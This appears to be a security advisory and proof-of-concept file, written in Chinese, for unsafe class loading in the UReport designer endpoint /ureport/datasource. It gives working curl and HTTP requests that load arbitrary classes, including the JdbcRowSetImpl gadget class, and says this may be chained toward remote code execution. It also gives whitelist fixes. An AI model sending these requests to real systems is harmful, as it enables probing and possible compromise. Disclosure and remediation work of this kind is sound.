@@ -1,0 +1,79 @@
+================================================================================
+PoC for VULN-001: UReport Designer Unsafe Class Loading
+================================================================================
+
+ Vulnerability: Unsafe Class Loading via Class.forName
+ Severity: HIGH (8.6 CVSS)
+ CWE: CWE-94
+ Affected Component: blade-starter-report
+
+================================================================================
+漏洞描述
+================================================================================
+
+在UReport报表设计器的DatasourceServletAction中，buildClass方法直接使用
+用户传入的clazz参数调用Class.forName，无任何验证，导致任意类加载。
+
+================================================================================
+PoC - 任意类加载测试
+================================================================================
+
+请求方式: GET
+目标端点: /ureport/datasource
+
+测试步骤:
+1. 访问以下URL尝试加载java.lang.String类:
+   GET /ureport/datasource?method=buildClass&clazz=java.lang.String
+
+   预期响应: 返回String类的属性列表 (说明类加载成功)
+
+2. 尝试加载任意类:
+   GET /ureport/datasource?method=buildClass&clazz=com.sun.rowset.JdbcRowSetImpl
+
+   预期响应: 如果类存在，返回其属性信息
+
+================================================================================
+PoC - cURL 命令
+================================================================================
+
+curl -i 'http://target:port/ureport/datasource?method=buildClass&clazz=java.lang.String'
+
+curl -i 'http://target:port/ureport/datasource?method=buildClass&clazz=com.sun.rowset.JdbcRowSetImpl'
+
+================================================================================
+Burp Suite 请求示例
+================================================================================
+
+GET /ureport/datasource?method=buildClass&clazz=java.lang.String HTTP/1.1
+Host: target:port
+User-Agent: Mozilla/5.0
+Accept: */*
+
+================================================================================
+影响分析
+================================================================================
+
+1. 信息泄露: 可以探测JVM中已加载的类
+2. 类加载攻击: 可能配合反序列化gadget chain进行RCE
+3. 绕过安全检查: 某些安全检查依赖于类名白名单，此漏洞可绕过
+
+================================================================================
+修复建议
+================================================================================
+
+1. 实现类名白名单验证:
+   private static final Set<String> ALLOWED_CLASSES = new HashSet<>(
+       Arrays.asList("java.lang.String", "java.util.Date", ...)
+   );
+
+   if (!ALLOWED_CLASSES.contains(clazz)) {
+       throw new SecurityException("Class not allowed");
+   }
+
+2. 添加身份认证和授权检查
+
+3. 前缀白名单 (如果需要支持多类):
+   if (!clazz.startsWith("com.yourcompany.safe.")) {
+       throw new SecurityException("Class not allowed");
+   }
+================================================================================
